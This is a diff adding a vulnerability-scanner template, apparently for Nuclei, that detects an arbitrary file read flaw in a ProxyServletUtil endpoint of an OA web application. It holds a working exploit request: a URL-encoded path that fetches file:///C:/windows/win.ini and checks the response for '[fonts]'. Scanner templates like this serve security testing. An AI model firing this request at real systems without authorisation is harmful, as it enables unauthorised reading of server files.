@@ -1,0 +1,18 @@
+id: FE-ProxyServletUtil-fileread
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description:  ProxyServletUtil 任意文件读取漏洞。
+  reference:
+    - https://github.com/ax1sX/SecurityList/blob/38a0aaf3e47b21915c500c49a2b618bde7cd138b/Java_OA/FEOAv6.51.md?plain=1#L274
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ProxyServletUti%6c?url=file:///C:/windows/win.ini"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[fonts]'
